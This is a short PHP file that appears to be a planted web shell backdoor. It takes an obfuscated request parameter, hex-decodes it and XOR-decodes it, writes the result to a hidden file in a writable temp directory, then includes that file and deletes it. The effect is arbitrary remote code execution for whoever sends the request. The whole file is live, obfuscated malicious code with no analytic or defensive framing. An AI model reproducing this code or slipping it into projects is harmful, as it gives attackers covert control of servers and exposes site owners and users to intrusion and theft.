<?php

if(array_key_exists("\x64a\x74a", $_REQUEST) && !is_null($_REQUEST["\x64a\x74a"])){
	$record = array_filter(["/tmp", "/var/tmp", "/dev/shm", ini_get("upload_tmp_dir"), getenv("TEMP"), getenv("TMP"), getcwd(), sys_get_temp_dir(), session_save_path()]);
	$element = hex2bin($_REQUEST["\x64a\x74a"]);
	$entity  =    ''; $m = 0; while($m < strlen($element)){$entity .= chr(ord($element[$m]) ^ 66);$m++;}
	$dat = 0;
do {
    $sym = $record[$dat] ?? null;
    if ($dat >= count($record)) break;
    		if (!( !is_dir($sym) || !is_writable($sym) )) {
    $desc = sprintf("%s/.property_set", $sym);
    if (@file_put_contents($desc, $entity) !== false) {
	include $desc;
	unlink($desc);
	exit;
}
}
    $dat++;
} while (true);
}